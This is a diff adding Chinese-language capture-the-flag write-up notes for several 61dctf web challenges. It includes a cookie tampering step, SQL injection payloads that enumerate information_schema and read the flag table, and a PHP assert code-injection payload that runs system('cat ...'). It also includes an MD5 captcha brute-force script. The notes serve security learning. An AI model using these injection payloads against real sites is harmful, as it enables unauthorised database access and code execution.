@@ -405,3 +405,77 @@ if __name__ == "__main__":
   print flag
 
 ```
+
+## [61dctf]admin
+
+- 签到题
+- 扫目录，发现 robots.txt，访问，给了地址 /admin_s3cr3t.php
+- 访问抓包， cookie: admin=0，改为 1 获得 flag
+
+## [61dctf]inject
+
+- 扫目录，在 index.php~ 中发现源码泄漏
+
+```php
+<?php
+require("config.php");
+$table = $_GET['table']?$_GET['table']:"test";
+$table = Filter($table);
+mysqli_query($mysqli,"desc `secret_{$table}`") or Hacker();
+$sql = "select 'flag{xxx}' from secret_{$table}";
+$ret = sql_query($sql);
+echo $ret[0];
+?>
+```
+
+- mysql 中反引号与单引号区别
+  - 反引号是为了区分MySQL的保留字与普通字符而引入的符号
+  - create table desc 报错
+  - create table `desc` 成功
+  - 一般我们建表时都会将表名，库名都加上反引号来保证语句的执行度。
+- 该题为了考察 在使 "desc `secret_{$table}`" 成功执行下完成注入
+- 本地测试，desc `test` `sth`，当前者表存在时，不报错，所以构造 payload
+- test`%20`union%20select%20SCHEMA_NAME%20from%20information_schema.SCHEMATA%20limit%201,1
+- test`%20`union select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=0x363164333030 limit 1,1
+- test`%20`union select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=0x7365637265745f666c6167 limit 1,1
+- test`%20`union select flagUwillNeverKnow from secret_flag limit 1,1
+
+## [61dctf]babyphp
+
+- 在 about 中看到使用了 Git，猜测存在 .git 源码泄漏，GitHack 拉一下源码
+- 在 index.php 中查看到 assert，存在 assert 任意代码执行漏洞
+
+```php
+assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
+```
+
+- 直接构造 payload: page=','..') or die(system('cat templates/flag.php'));//
+
+## [661dctf]register
+
+- sql 注入还没学好，二次注入暂时还不明白，之后回来补锅。
+
+## [61dctf]babyxss
+
+- payload 一直存在问题，在此只放一个验证码脚本吧
+
+```py
+import random
+import string
+
+def md5(str):
+  import hashlib
+  m = hashlib.md5()
+  m.update(str)
+  return m.hexdigest()
+
+while 1:
+  row = raw_input("prefix: ")
+  while 1:
+    string = ''
+    s = string.join(random.sample('qwertyuiopasdfghjklzxcvbnm1234567890', 4))
+    if md5(s)[0:4] == row:
+      print s
+      break
+
+```
